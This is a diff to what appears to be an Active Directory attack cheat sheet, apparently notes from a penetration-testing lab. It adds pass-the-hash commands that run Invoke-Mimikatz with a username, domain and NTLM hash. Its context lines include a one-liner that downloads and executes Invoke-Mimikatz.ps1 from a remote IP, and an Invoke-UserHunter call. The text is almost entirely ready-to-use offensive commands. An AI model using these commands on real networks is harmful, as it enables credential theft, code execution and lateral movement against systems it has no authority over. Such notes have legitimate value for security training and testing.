@@ -166,6 +166,14 @@ Invoke-UserHunter -showall -Credential $cred -ComputerName workstation04 | Forma
 
 ### Attack
 
+#### Over pass the hash
+
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmhash> /run:powershell.exe
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+```
+
+
 #### Mimikatz
 ```powershell
 iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
